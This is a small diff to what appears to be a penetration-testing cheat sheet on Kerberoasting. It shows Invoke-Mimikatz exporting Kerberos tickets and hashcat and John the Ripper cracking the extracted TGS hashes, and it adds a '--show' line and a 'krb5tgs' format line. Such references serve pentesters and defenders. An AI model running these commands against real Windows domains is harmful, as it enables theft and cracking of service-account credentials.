@@ -313,9 +313,11 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 ```
 hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt
 hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt -o quebradas.txt
+hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt --show
 ```
 ```
 john hashestgt.txt --wordlist=wordlist.txt
+john --format=krb5tgs hashestgt.txt --wordlist=wordlist.txt
 john --show hashestgt.txt
 ```
 # POWERSHELL
